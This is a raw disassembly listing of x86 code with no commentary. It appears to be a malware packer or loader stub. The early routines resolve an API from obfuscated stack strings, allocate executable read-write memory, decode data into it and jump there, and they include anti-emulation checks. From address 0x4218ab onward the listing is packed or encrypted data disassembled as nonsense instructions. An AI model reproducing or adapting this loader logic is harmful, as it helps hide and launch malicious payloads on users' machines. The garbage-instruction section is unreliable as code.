  42157a:	mov    DWORD PTR [ebp-0x30],0x0
  421581:	mov    DWORD PTR [ebp-0x58],0x0
  421588:	mov    DWORD PTR [ebp-0x54],0x0
  42158f:	mov    DWORD PTR [ebp-0x8],0x0
  421596:	mov    DWORD PTR [ebp-0x60],0x0
  42159d:	mov    DWORD PTR [ebp-0x50],0x0
  4215a4:	mov    DWORD PTR [ebp-0xc],0x0
  4215ab:	mov    DWORD PTR [ebp-0x6c],0x0
  4215b2:	mov    DWORD PTR [ebp-0x5c],0x0
  4215b9:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x68],0x0
  4215c7:	mov    DWORD PTR [ebp-0x4],0x0
  4215ce:	mov    DWORD PTR [ebp-0x4c],0x0
  4215d5:	mov    eax,ds:0x428140
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428144
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428148
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42814c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x428130
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x428134
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428138
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x42813c
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x42813e
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x2c],0x40
  42162c:	push   0x64
  42162e:	push   0x0
  421630:	call   DWORD PTR ds:0x42801c
  421636:	lea    eax,[ebp-0xc]
  421639:	push   eax
  42163a:	lea    ecx,[ebp-0xc]
  42163d:	push   ecx
  42163e:	lea    edx,[ebp-0x14]
  421641:	push   edx
  421642:	call   DWORD PTR ds:0x428004
  421648:	test   eax,eax
  42164a:	je     0x421661
  42164c:	push   0x0
  42164e:	mov    eax,DWORD PTR [ebp-0x6c]
  421651:	push   eax
  421652:	call   DWORD PTR ds:0x428118
  421658:	mov    ecx,DWORD PTR [ebp-0xc]
  42165b:	add    ecx,0x1
  42165e:	mov    DWORD PTR [ebp-0xc],ecx
  421661:	push   0x0
  421663:	push   0x0
  421665:	push   0x0
  421667:	call   DWORD PTR ds:0x428000
  42166d:	mov    BYTE PTR [ebp-0x40],0x56
  421671:	call   DWORD PTR ds:0x428018
  421677:	mov    DWORD PTR [ebp-0x30],eax
  42167a:	mov    BYTE PTR [ebp-0x3e],0x72
  42167e:	movzx  edx,WORD PTR [ebp-0x30]
  421682:	test   edx,edx
  421684:	jne    0x4216ce
  421686:	mov    BYTE PTR [ebp-0x34],0x0
  42168a:	mov    DWORD PTR [ebp-0x14],0xe0d
  421691:	lea    eax,[ebp-0x28]
  421694:	push   eax
  421695:	call   DWORD PTR ds:0x428014
  42169b:	mov    DWORD PTR [ebp-0x60],eax
  42169e:	mov    DWORD PTR [ebp-0x50],0x3a
  4216a5:	lea    ecx,[ebp-0x40]
  4216a8:	push   ecx
  4216a9:	mov    edx,DWORD PTR [ebp-0x60]
  4216ac:	push   edx
  4216ad:	call   DWORD PTR ds:0x428010
  4216b3:	mov    DWORD PTR [ebp-0x44],eax
  4216b6:	mov    DWORD PTR [ebp-0x8],0xf3b0a126
  4216bd:	push   0xa
  4216bf:	call   DWORD PTR ds:0x42811c
  4216c5:	mov    DWORD PTR [ebp-0x68],0x10d757
  4216cc:	jmp    0x4216e3
  4216ce:	mov    BYTE PTR ds:0x445160,0x0
  4216d5:	mov    BYTE PTR ds:0x42bf40,0x0
  4216dc:	mov    BYTE PTR ds:0x442930,0x0
  4216e3:	push   DWORD PTR [ebp-0x2c]
  4216e6:	push   0x1000
  4216eb:	mov    eax,DWORD PTR [ebp-0x14]
  4216ee:	add    eax,0x23
  4216f1:	add    eax,0x23
  4216f4:	push   eax
  4216f5:	xor    eax,eax
  4216f7:	push   eax
  4216f8:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fb:	call   ecx
  4216fd:	mov    edx,eax
  4216ff:	mov    DWORD PTR [ebp-0x4],edx
  421702:	mov    eax,DWORD PTR [ebp-0x68]
  421705:	sub    eax,0xdae0b
  42170a:	mov    DWORD PTR [ebp-0x68],eax
  42170d:	cmp    DWORD PTR [ebp-0x4],0x0
  421711:	jne    0x421724
  421713:	push   0x0
  421715:	push   0x0
  421717:	call   DWORD PTR ds:0x428120
  42171d:	mov    BYTE PTR ds:0x442930,0x0
  421724:	mov    ecx,DWORD PTR [ebp-0x4]
  421727:	add    ecx,DWORD PTR [ebp-0x14]
  42172a:	mov    edx,DWORD PTR [ebp-0x8]
  42172d:	mov    DWORD PTR [ecx],edx
  42172f:	push   DWORD PTR ds:0x428014
  421735:	pop    edx
  421736:	mov    DWORD PTR [ebp-0x70],edx
  421739:	mov    DWORD PTR [ebp-0x30],0x410000
  421740:	call   DWORD PTR ds:0x42800c
  421746:	mov    eax,DWORD PTR [ebp-0x4]
  421749:	add    eax,DWORD PTR [ebp-0x50]
  42174c:	mov    DWORD PTR [ebp-0x5c],eax
  42174f:	mov    ecx,DWORD PTR ds:0x428010
  421755:	mov    DWORD PTR [ebp-0x4c],ecx
  421758:	mov    edx,DWORD PTR [ebp-0x4]
  42175b:	add    edx,DWORD PTR [ebp-0x14]
  42175e:	mov    eax,DWORD PTR [ebp+0x8]
  421761:	mov    DWORD PTR [edx+0x4],eax
  421764:	mov    ecx,DWORD PTR [ebp-0x4]
  421767:	add    ecx,DWORD PTR [ebp-0x14]
  42176a:	mov    DWORD PTR [ebp-0x10],ecx
  42176d:	push   0x0
  42176f:	push   0x1
  421771:	mov    edx,DWORD PTR [ebp-0x60]
  421774:	push   edx
  421775:	call   DWORD PTR ds:0x428030
  42177b:	cmp    DWORD PTR [ebp-0x68],0x0
  42177f:	jbe    0x42179c
  421781:	mov    eax,DWORD PTR [ebp-0x10]
  421784:	push   eax
  421785:	mov    ecx,DWORD PTR [ebp-0x14]
  421788:	push   ecx
  421789:	mov    edx,DWORD PTR [ebp-0x30]
  42178c:	add    edx,DWORD PTR [ebp-0x68]
  42178f:	push   edx
  421790:	mov    eax,DWORD PTR [ebp-0x4]
  421793:	push   eax
  421794:	call   0x411000
  421799:	add    esp,0x10
  42179c:	call   DWORD PTR ds:0x428044
  4217a2:	cmp    DWORD PTR [ebp-0x5c],0x0
  4217a6:	je     0x4217ba
  4217a8:	mov    ecx,DWORD PTR [ebp-0x4c]
  4217ab:	push   ecx
  4217ac:	push   DWORD PTR [ebp-0x70]
  4217af:	mov    esi,DWORD PTR [ebp-0x5c]
  4217b2:	push   edx
  4217b3:	pop    eax
  4217b4:	push   ecx
  4217b5:	nop
  4217b6:	jmp    esi
  4217b8:	jmp    0x4217cd
  4217ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4217bd:	mov    DWORD PTR [ebp-0x18],ecx
  4217c0:	push   0x0
  4217c2:	push   0x83232
  4217c7:	call   DWORD PTR ds:0x42804c
  4217cd:	mov    eax,0x1
  4217d2:	pop    esi
  4217d3:	mov    esp,ebp
  4217d5:	pop    ebp
  4217d6:	ret    
  4217d7:	int3   
  4217d8:	int3   
  4217d9:	int3   
  4217da:	int3   
  4217db:	int3   
  4217dc:	int3   
  4217dd:	int3   
  4217de:	int3   
  4217df:	int3   
  4217e0:	push   ebp
  4217e1:	mov    ebp,esp
  4217e3:	sub    esp,0x8
  4217e6:	push   esi
  4217e7:	push   0x0
  4217e9:	push   0x1
  4217eb:	push   0x0
  4217ed:	mov    DWORD PTR [ebp-0x4],0x0
  4217f4:	call   DWORD PTR ds:0x428030
  4217fa:	mov    eax,ds:0x428018
  4217ff:	push   0x0
  421801:	mov    DWORD PTR [ebp-0x8],eax
  421804:	call   DWORD PTR ds:0x428028
  42180a:	push   0x0
  42180c:	push   0x4e
  42180e:	push   0x1e
  421810:	push   0x0
  421812:	push   0xffffffff
  421814:	call   DWORD PTR ds:0x428024
  42181a:	mov    esi,DWORD PTR [ebp-0x8]
  42181d:	call   esi
  42181f:	mov    DWORD PTR [ebp-0x4],eax
  421822:	cmp    DWORD PTR [ebp-0x4],0x57
  421826:	jne    0x42183d
  421828:	push   0x6cab944b
  42182d:	call   0x421550
  421832:	add    esp,0x4
  421835:	push   0x0
  421837:	call   DWORD PTR ds:0x428020
  42183d:	xor    eax,eax
  42183f:	pop    esi
  421840:	mov    esp,ebp
  421842:	pop    ebp
  421843:	ret    
  421844:	nop
  421845:	nop
  421846:	nop
  421847:	nop
  421848:	nop
  421849:	nop
  42184a:	nop
  42184b:	nop
  42184c:	nop
  42184d:	nop
  42184e:	nop
  42184f:	nop
  421850:	sub    esp,0x10
  421853:	push   esi
  421854:	push   0x3
  421856:	push   0x0
  421858:	push   0x18
  42185a:	push   0x0
  42185c:	call   DWORD PTR ds:0x428128
  421862:	push   0x0
  421864:	push   0x0
  421866:	call   DWORD PTR ds:0x428124
  42186c:	lea    eax,[esp+0x4]
  421870:	push   eax
  421871:	call   DWORD PTR ds:0x428038
  421877:	push   0x0
  421879:	call   DWORD PTR ds:0x428034
  42187f:	cmp    WORD PTR [esp+0x4],0x0
  421885:	mov    esi,DWORD PTR ds:0x428048
  42188b:	push   0x0
  42188d:	je     0x4218a0
  42188f:	call   esi
  421891:	push   0x0
  421893:	call   0x4217e0
  421898:	add    esp,0x4
  42189b:	jmp    0x4229d8
  4218a0:	push   0xa
  4218a2:	push   0x0
  4218a4:	push   0xffffffff
  4218a6:	call   0x422a00
  4218ab:	(bad)  
  4218ac:	sti    
  4218ad:	sbb    ch,BYTE PTR [ebp-0x4d9b638e]
  4218b3:	aad    0xfb
  4218b5:	jo     0x421906
  4218b7:	xor    eax,ecx
  4218b9:	dec    ecx
  4218ba:	inc    eax
  4218bb:	cmp    eax,0xb2649fca
  4218c0:	aad    0xff
  4218c2:	jo     0x421913
  4218c4:	jno    0x4218fd
  4218c6:	mov    dh,0x40
  4218c8:	cmp    eax,0xb2649f72
  4218cd:	aad    0xff
  4218cf:	jo     0x421920
  4218d1:	xor    DWORD PTR [edi],esi
  4218d3:	mov    dh,0x40
  4218d5:	cmp    eax,0xb2649f72
  4218da:	aad    0xff
  4218dc:	jo     0x42192d
  4218de:	xor    DWORD PTR [edi],esi
  4218e0:	mov    dh,0x40
  4218e2:	cmp    eax,0xb2649f72
  4218e7:	aad    0x7
  4218e9:	jo     0x42193a
  4218eb:	xor    DWORD PTR [ecx],edi
  4218ed:	test   eax,0x2b7233fa
  4218f2:	ins    DWORD PTR es:[edi],dx
  4218f3:	jg     0x4218e9
  4218f5:	inc    edi
  4218f6:	jno    0x4218fb
  4218f8:	cld    
  4218f9:	push   ss
  4218fa:	loop   0x421924
  4218fc:	push   esp
  4218fd:	add    DWORD PTR [edi-0x67453fec],edi
  421903:	add    ch,BYTE PTR [esi]
  421905:	pop    esp
  421906:	pop    ss
  421907:	aad    0x21
  421909:	push   ebx
  42190a:	sbb    al,0xf0
  42190c:	adc    BYTE PTR [edx+0x3d509ab7],dl
  421912:	inc    esp
  421913:	pop    ecx
  421914:	xchg   esi,eax
  421915:	sub    DWORD PTR [ebx+0x52],edx
  421918:	fld    TBYTE PTR [ebx]
  42191a:	loope  0x421911
  42191c:	xchg   edx,eax
  42191d:	pop    ds
  42191e:	sub    edx,DWORD PTR [ecx+ebx*1-0x45]
  421922:	dec    ebp
  421923:	aaa    
  421924:	push   esi
  421925:	lahf   
  421926:	fs mov dl,0xd5
  421929:	push   DWORD PTR [eax+0x4f]
  42192c:	ss scas al,BYTE PTR es:[edi]
  42192e:	dec    edx
  42192f:	sbb    DWORD PTR [esi-0x76],edi
  421932:	or     eax,0x6d2df16e
  421937:	jp     0x421945
  421939:	leave  
  42193a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42193b:	mov    esp,0x957e5818
  421940:	cmp    ecx,DWORD PTR [edx+0x47]
  421943:	cmc    
  421944:	sub    BYTE PTR [edx],ch
  421946:	or     DWORD PTR ds:0x78afb874,edi
  42194c:	mov    DWORD PTR [ecx],0x8897df8b
  421952:	fnstsw WORD PTR [ebx]
  421954:	sbb    edi,DWORD PTR [eax]
  421956:	jns    0x42198f
  421958:	xor    al,0x67
  42195a:	idiv   BYTE PTR [eax+0x45617f9f]
  421960:	jnp    0x421931
  421962:	and    al,0x4a
  421964:	ja     0x421958
  421966:	sahf   
  421967:	outs   dx,BYTE PTR ds:[esi]
  421968:	jmp    0xa4c9:0xc7a6d2d
  42196f:	mov    esp,0x95e0c468
  421974:	fld    TBYTE PTR [edx+0x55]
  421977:	cmc    
  421978:	cmp    eax,0xee3da3b7
  42197d:	and    eax,0x9c977800
  421982:	and    bh,bl
  421984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421985:	adc    eax,0x4e753b47
  42198a:	shl    BYTE PTR [edi],cl
  42198c:	sub    bh,dl
  42198e:	imul   edi,DWORD PTR [eax+0x45e20797],0x63
  421995:	pop    esi
  421996:	aad    0x28
  421998:	jle    0x421924
  42199a:	or     eax,0xffd5b26e
  42199f:	jo     0x4219f0
  4219a1:	xor    DWORD PTR [edi],esi
  4219a3:	mov    dh,0x10
  4219a5:	js     0x421a19
  4219a7:	lahf   
  4219a8:	sub    BYTE PTR [ebx-0x53630029],dh
  4219ae:	outs   dx,BYTE PTR ds:[esi]
  4219af:	js     0x421967
  4219b1:	inc    eax
  4219b2:	cmp    eax,0xb2649f72
  4219b7:	aad    0x1f
  4219b9:	jo     0x421a07
  4219bb:	xor    BYTE PTR [edi+esi*4],bh
  4219be:	dec    edx
  4219bf:	cmp    eax,0xb2607372
  4219c4:	aad    0xfb
  4219c6:	jbe    0x421a17
  4219c8:	xor    DWORD PTR [edi],esi
  4219ca:	mov    dh,0x40
  4219cc:	cmp    al,0xcf
  4219ce:	lahf   
  4219cf:	fs mov dl,0xc5
  4219d2:	push   DWORD PTR [eax+0x4f]
  4219d5:	xor    DWORD PTR [edx],esi
  4219d7:	mov    dh,0x40
  4219d9:	cmp    eax,0xa2649f33
  4219de:	aad    0xff
  4219e0:	jo     0x421a2f
  4219e2:	xor    DWORD PTR [edi],esi
  4219e4:	mov    bl,0x40
  4219e6:	cmp    al,0x72
  4219e8:	lahf   
  4219e9:	fs mov dl,0xd5
  4219ec:	cli    
  4219ed:	jo     0x421a3d
  4219ef:	xor    DWORD PTR [edi],esi
  4219f1:	mov    dh,0x40
  4219f3:	cmp    eax,0xb26f1f72
  4219f8:	aad    0xfb
  4219fa:	jo     0x421a4b
  4219fc:	mov    WORD PTR [esi],es
  4219fe:	mov    bl,0x40
  421a00:	aas    
  421a01:	jb     0x4219a2
  421a03:	in     al,0xb2
  421a05:	aad    0xef
  421a07:	jo     0x421a58
  421a09:	and    DWORD PTR [edi],esi
  421a0b:	mov    dh,0x40
  421a0d:	cmp    eax,0xa2649f62
  421a12:	aad    0xff
  421a14:	jo     0x421a65
  421a16:	xor    DWORD PTR [edi],esi
  421a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a19:	inc    eax
  421a1a:	cmp    eax,0xb2649f72
  421a1f:	aad    0xff
  421a21:	jo     0x421a72
  421a23:	xor    DWORD PTR [ebx+0x1b3d4bd8],esi
  421a29:	pushf  
  421a2a:	fs mov dl,0xd5
  421a2d:	iret   
  421a2e:	jnp    0x421a7f
  421a30:	dec    BYTE PTR [edx]
  421a32:	mov    dh,0x40
  421a34:	cmp    eax,0xb2649f72
  421a39:	aad    0xff
  421a3b:	jo     0x421a8c
  421a3d:	xor    DWORD PTR [edi],esi
  421a3f:	mov    dh,0x40
  421a41:	cmp    eax,0xb2649f72
  421a46:	aad    0xff
  421a48:	jo     0x421a99
  421a4a:	xor    DWORD PTR [edi],esi
  421a4c:	mov    dh,0x40
  421a4e:	cmp    eax,0xb2649f72
  421a53:	aad    0xff
  421a55:	jo     0x421aa6
  421a57:	xor    DWORD PTR [edi],esi
  421a59:	mov    dh,0x40
  421a5b:	cmp    eax,0xb2649f72
  421a60:	aad    0xff
  421a62:	jo     0x421ab3
  421a64:	xor    DWORD PTR [edi],esi
  421a66:	mov    dh,0x40
  421a68:	cmp    eax,0xb2649f72
  421a6d:	aad    0xff
  421a6f:	jo     0x421ac0
  421a71:	xor    DWORD PTR [edi],esi
  421a73:	mov    dh,0x40
  421a75:	cmp    eax,0xb2649f72
  421a7a:	aad    0xff
  421a7c:	jo     0x421acd
  421a7e:	xor    DWORD PTR [edi],esi
  421a80:	mov    dh,0x40
  421a82:	cmp    eax,0xb2649f72
  421a87:	aad    0xff
  421a89:	jo     0x421ada
  421a8b:	xor    DWORD PTR [edi],esi
  421a8d:	mov    dh,0x40
  421a8f:	cmp    eax,0xb2649f72
  421a94:	aad    0xff
  421a96:	jo     0x421ae7
  421a98:	xor    DWORD PTR [edi],esi
  421a9a:	mov    dh,0x40
  421a9c:	adc    eax,DWORD PTR [esi]
  421a9e:	cli    
  421a9f:	sbb    al,0xc6
  421aa1:	aad    0xff
  421aa3:	jo     0x421af4
  421aa5:	adc    DWORD PTR [esi+esi*4],edi
  421aa8:	inc    eax
  421aa9:	sub    eax,0x88649f72
  421aae:	sar    edi,1
  421ab0:	jo     0x421afd
  421ab2:	xor    DWORD PTR [edi],esi
  421ab4:	out    0x5,al
  421ab6:	jle    0x421af8
  421ab8:	retf   
  421ab9:	sub    esi,DWORD PTR [edx+0x4f70ffd5]
  421abf:	xor    DWORD PTR [edi],edx
  421ac1:	mov    dh,0x40
  421ac3:	fstp   QWORD PTR [ebp+ebp*8+0x17]
  421ac7:	shl    BYTE PTR [esi+0x314f70ff],0x67
  421ace:	mov    dh,0x40
  421ad0:	cmp    eax,0xb2649442
  421ad5:	test   edi,edi
  421ad7:	jo     0x421b28
  421ad9:	rdpmc  
  421adb:	mov    dh,0x40
  421add:	cmp    eax,0xb2649f72
  421ae2:	aad    0xff
  421ae4:	jo     0x421b35
  421ae6:	xor    DWORD PTR [edi],esi
  421ae8:	xchg   esi,eax
  421ae9:	inc    eax
  421aea:	cmp    eax,0xb2649f92
  421aef:	aad    0xff
  421af1:	jo     0x421b42
  421af3:	xor    DWORD PTR [edi],esi
  421af5:	mov    dh,0x40
  421af7:	cmp    eax,0xb2649f72
  421afc:	aad    0xff
  421afe:	jo     0x421b4f
  421b00:	xor    DWORD PTR [edi],esi
  421b02:	mov    dh,0x40
  421b04:	cmp    eax,0xb2649f72
  421b09:	aad    0xff
  421b0b:	jo     0x421b5c
  421b0d:	xor    DWORD PTR [edi],esi
  421b0f:	mov    dh,0x40
  421b11:	cmp    eax,0xb2649f72
  421b16:	aad    0xff
  421b18:	jo     0x421b69
  421b1a:	xor    DWORD PTR [edi],esi
  421b1c:	mov    dh,0x40
  421b1e:	cmp    eax,0xb2649f72
  421b23:	aad    0xff
  421b25:	jo     0x421b76
  421b27:	xor    DWORD PTR [edi],esi
  421b29:	mov    dh,0x40
  421b2b:	cmp    eax,0xb2649f72
  421b30:	aad    0xff
  421b32:	jo     0x421b83
  421b34:	xor    DWORD PTR [edi],esi
  421b36:	mov    dh,0x40
  421b38:	cmp    eax,0xb2649f72
  421b3d:	aad    0xff
  421b3f:	jo     0x421b90
  421b41:	xor    DWORD PTR [edi],esi
  421b43:	mov    dh,0x40
  421b45:	cmp    eax,0xb2649f72
  421b4a:	aad    0xff
  421b4c:	jo     0x421b9d
  421b4e:	xor    DWORD PTR [edi],esi
  421b50:	mov    dh,0x40
  421b52:	cmp    eax,0xb2649f72
  421b57:	aad    0xff
  421b59:	jo     0x421baa
  421b5b:	xor    DWORD PTR [edi],esi
  421b5d:	mov    dh,0x40
  421b5f:	cmp    eax,0xb2649f72
  421b64:	aad    0xff
  421b66:	jo     0x421bb7
  421b68:	xor    DWORD PTR [edi],esi
  421b6a:	mov    dh,0x40
  421b6c:	cmp    eax,0xb2649f72
  421b71:	aad    0xff
  421b73:	jo     0x421bc4
  421b75:	xor    DWORD PTR [edi],esi
  421b77:	mov    dh,0x40
  421b79:	cmp    eax,0xb2649f72
  421b7e:	aad    0xff
  421b80:	jo     0x421bd1
  421b82:	xor    DWORD PTR [edi],esi
  421b84:	mov    dh,0x40
  421b86:	cmp    eax,0xb2649f72
  421b8b:	aad    0xff
  421b8d:	jo     0x421bde
  421b8f:	xor    DWORD PTR [edi],esi
  421b91:	mov    dh,0x40
  421b93:	cmp    eax,0xb2649f72
  421b98:	aad    0xff
  421b9a:	jo     0x421beb
  421b9c:	xor    DWORD PTR [edi],esi
  421b9e:	mov    dh,0x40
  421ba0:	cmp    eax,0xb2649f72
  421ba5:	aad    0xff
  421ba7:	jo     0x421bf8
  421ba9:	xor    DWORD PTR [edi],esi
  421bab:	mov    dh,0x40
  421bad:	cmp    eax,0xb2649f72
  421bb2:	aad    0xff
  421bb4:	jo     0x421c05
  421bb6:	xor    DWORD PTR [edi],esi
  421bb8:	mov    dh,0x40
  421bba:	cmp    eax,0xb2649f72
  421bbf:	aad    0xff
  421bc1:	jo     0x421c12
  421bc3:	xor    DWORD PTR [edi],esi
  421bc5:	mov    dh,0x40
  421bc7:	cmp    eax,0xb2649f72
  421bcc:	aad    0xff
  421bce:	jo     0x421c1f
  421bd0:	xor    DWORD PTR [edi],esi
  421bd2:	mov    dh,0x40
  421bd4:	cmp    eax,0xb2649f72
  421bd9:	aad    0xff
  421bdb:	jo     0x421c2c
  421bdd:	xor    DWORD PTR [edi],esi
  421bdf:	mov    dh,0x40
  421be1:	cmp    eax,0xb2649f72
  421be6:	aad    0xff
  421be8:	jo     0x421c39
  421bea:	xor    DWORD PTR [edi],esi
  421bec:	mov    dh,0x40
  421bee:	cmp    eax,0xb2649f72
  421bf3:	aad    0xff
  421bf5:	jo     0x421c46
  421bf7:	xor    DWORD PTR [edi],esi
  421bf9:	mov    dh,0x40
  421bfb:	cmp    eax,0xb2649f72
  421c00:	aad    0xff
  421c02:	jo     0x421c53
  421c04:	xor    DWORD PTR [edi],esi
  421c06:	mov    dh,0x40
  421c08:	cmp    eax,0xb2649f72
  421c0d:	aad    0xff
  421c0f:	jo     0x421c60
  421c11:	xor    DWORD PTR [edi],esi
  421c13:	mov    dh,0x40
  421c15:	cmp    eax,0xb2649f72
  421c1a:	aad    0xff
  421c1c:	jo     0x421c6d
  421c1e:	xor    DWORD PTR [edi],esi
  421c20:	mov    dh,0x40
  421c22:	cmp    eax,0xb2649f72
  421c27:	aad    0xff
  421c29:	jo     0x421c7a
  421c2b:	xor    DWORD PTR [edi],esi
  421c2d:	mov    dh,0x40
  421c2f:	cmp    eax,0xb2649f72
  421c34:	aad    0xff
  421c36:	jo     0x421c87
  421c38:	xor    DWORD PTR [edi],esi
  421c3a:	mov    dh,0x40
  421c3c:	cmp    eax,0xb2649f72
  421c41:	aad    0xff
  421c43:	jo     0x421c94
  421c45:	xor    DWORD PTR [edi],esi
  421c47:	mov    dh,0x40
  421c49:	cmp    eax,0xb2649f72
  421c4e:	aad    0xff
  421c50:	jo     0x421ca1
  421c52:	xor    DWORD PTR [edi],esi
  421c54:	mov    dh,0x40
  421c56:	cmp    eax,0xb2649f72
  421c5b:	aad    0xff
  421c5d:	jo     0x421cae
  421c5f:	xor    DWORD PTR [edi],esi
  421c61:	mov    dh,0x40
  421c63:	cmp    eax,0xb2649f72
  421c68:	aad    0xff
  421c6a:	jo     0x421cbb
  421c6c:	xor    DWORD PTR [edi],esi
  421c6e:	mov    dh,0x40
  421c70:	cmp    eax,0xb2649f72
  421c75:	aad    0xff
  421c77:	jo     0x421cc8
  421c79:	xor    DWORD PTR [edi],esi
  421c7b:	mov    dh,0x40
  421c7d:	cmp    eax,0xb2649f72
  421c82:	aad    0xff
  421c84:	jo     0x421cd5
  421c86:	xor    DWORD PTR [edi],esi
  421c88:	mov    dh,0x40
  421c8a:	cmp    eax,0xb2649f72
  421c8f:	aad    0xff
  421c91:	jo     0x421ce2
  421c93:	xor    DWORD PTR [edi],esi
  421c95:	mov    dh,0x40
  421c97:	cmp    eax,0xb2649f72
  421c9c:	aad    0xff
  421c9e:	jo     0x421cef
  421ca0:	xor    DWORD PTR [edi],esi
  421ca2:	mov    dh,0x40
  421ca4:	cmp    eax,0xb2649f72
  421ca9:	aad    0xff
  421cab:	jo     0x421cb5
  421cad:	fistp  QWORD PTR ds:0x723d6fb6
  421cb3:	(bad)  
  421cb4:	fs mov dl,0xff
  421cb7:	pop    ebp
  421cb8:	stos   BYTE PTR es:[edi],al
  421cb9:	ds push edi
  421cbb:	enter  0xde9b,0xba
  421cbf:	and    dh,BYTE PTR [edx+0x52]
  421cc2:	pop    edx
  421cc3:	(bad)  
  421cc4:	dec    ebx
  421cc5:	in     eax,0x29
  421cc7:	inc    eax
  421cc8:	mov    bl,0xec
  421cca:	push   ebx
  421ccb:	mov    ebp,es
  421ccd:	mov    DWORD PTR [ecx],ecx
  421ccf:	push   esi
  421cd0:	pop    edi
  421cd1:	jle    0x421c89
  421cd3:	popa   
  421cd4:	push   ebx
  421cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cd6:	mov    DWORD PTR [ecx+0xe],edi
  421cd9:	cmp    eax,0xd590732e
  421cde:	fcom   st(7)
  421ce0:	(bad)  
  421ce1:	fs data16 fucomi st,st(1)
  421ce5:	cmovg  eax,DWORD PTR [edx+0x70]
  421ce9:	add    esi,DWORD PTR [ebp+0x20692bef]
  421cef:	fcomp  st(7)
  421cf1:	loope  0x421d44
  421cf3:	xchg   ebp,eax
  421cf4:	and    eax,0xab587548
  421cf9:	mov    ?,WORD PTR [ecx+0x41]
  421cfc:	cli    
  421cfd:	das    
  421cfe:	inc    edx
  421cff:	popf   
  421d00:	mov    ebx,0xeacbf39b
  421d05:	jecxz  0x421d0c
  421d07:	push   edx
  421d08:	sbb    BYTE PTR [ecx+0x35e5db61],0xd5
  421d0f:	push   0xca93d8fb
  421d14:	lds    edi,FWORD PTR [edi+edi*2]
  421d17:	dec    eax
  421d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d19:	retf   0x954f
  421d1c:	add    esp,esp
  421d1e:	arpl   WORD PTR [esi+ebp*8],di
  421d21:	(bad)  
  421d22:	push   ecx
  421d23:	loope  0x421d22
  421d25:	add    ebx,ecx
  421d27:	nop
  421d28:	jbe    0x421cde
  421d2a:	stc    
  421d2b:	push   esi
  421d2c:	daa    
  421d2d:	pop    ebx
  421d2e:	out    dx,eax
  421d2f:	xor    eax,0x79de3ddc
  421d34:	nop
  421d35:	dec    eax
  421d36:	push   ss
  421d37:	xchg   ecx,eax
  421d38:	rcl    dl,cl
  421d3a:	mov    ds:0xec52109f,eax
  421d3f:	or     BYTE PTR [ebx],al
  421d41:	and    ebx,DWORD PTR [eax+ebp*4]
  421d44:	icebp  
  421d45:	add    DWORD PTR [edx+esi*2],edx
  421d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d49:	jmp    0x421d48
  421d4b:	je     0x421d5d
  421d4d:	adc    BYTE PTR [ecx+edx*8-0x2e],dl
  421d51:	mov    DWORD PTR [eax-0x4b0f4ce5],ebp
  421d57:	sub    BYTE PTR [bp+di],ah
  421d5a:	mulps  xmm5,XMMWORD PTR [esi]
  421d5d:	xchg   ebx,eax
  421d5e:	pop    ebp
  421d5f:	sub    BYTE PTR [esi],al
  421d61:	xchg   edi,eax
  421d62:	mov    esp,0x28ecfcbf
  421d67:	adc    BYTE PTR [eax],bl
  421d69:	fwait
  421d6a:	sahf   
  421d6b:	cmp    al,0x92
  421d6d:	jns    0x421d57
  421d6f:	jne    0x421d20
  421d71:	sar    DWORD PTR [edi+0x4a7b94c6],0xaa
  421d78:	adc    DWORD PTR [edx+0x2f],esi
  421d7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d7c:	push   ecx
  421d7d:	xchg   esp,eax
  421d7e:	adc    eax,0x4ee6986c
  421d83:	stos   DWORD PTR es:[edi],eax
  421d84:	push   esi
  421d85:	pop    esi
  421d86:	mov    dh,0x4f
  421d88:	pop    ds
  421d89:	pop    esi
  421d8a:	shr    DWORD PTR [edx],cl
  421d8c:	int    0x14
  421d8e:	jmp    0x228b2bb3
  421d93:	in     al,dx
  421d94:	lods   eax,DWORD PTR ds:[esi]
  421d95:	out    0xcb,eax
  421d97:	cli    
  421d98:	in     al,0x10
  421d9a:	fwait
  421d9b:	jp     0x421df6
  421d9d:	(bad)  
  421d9e:	div    DWORD PTR [esi+0x67]
  421da1:	or     eax,0x8beafdd8
  421da6:	mov    ch,0x1b
  421da8:	pop    esi
  421da9:	and    DWORD PTR [edx+eiz*2],esp
  421dac:	xor    ebx,DWORD PTR [ebx+0x2f2ce960]
  421db2:	dec    edx
  421db3:	mov    ch,0xcf
  421db5:	push   ss
  421db6:	fst    DWORD PTR [eax+0x21]
  421db9:	push   0x3699e7
  421dbe:	xchg   esi,eax
  421dbf:	sbb    al,0x21
  421dc1:	inc    esi
  421dc2:	retf   
  421dc3:	repz dec eax
  421dc5:	cli    
  421dc6:	cwde   
  421dc7:	inc    esp
  421dc8:	outs   dx,BYTE PTR ds:[esi]
  421dc9:	pop    esp
  421dca:	gs popa 
  421dcc:	jb     0x421d5b
  421dce:	(bad)  
  421dd0:	gs or  al,0x8a
  421dd3:	mov    eax,ds:0xb3723f68
  421dd8:	(bad)  
  421dd9:	stos   BYTE PTR es:[edi],al
  421dda:	rcl    BYTE PTR [ebx+0x7dfb83df],cl
  421de0:	or     edi,DWORD PTR [eax]
